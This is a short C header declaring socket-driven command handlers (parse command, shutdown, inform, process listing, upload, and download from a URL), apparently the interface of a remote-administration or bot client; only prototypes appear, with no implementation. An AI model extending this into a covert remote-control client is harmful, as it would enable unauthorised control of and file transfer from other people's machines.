#include "..\shared.h"

int parseCommand(SOCKET, char* input);
int cmdShutdown();
int cmdInform(SOCKET);
int cmdProc(SOCKET);
int cmdUpload(SOCKET, char* args);
int cmdDownload(char* filename, char* url);

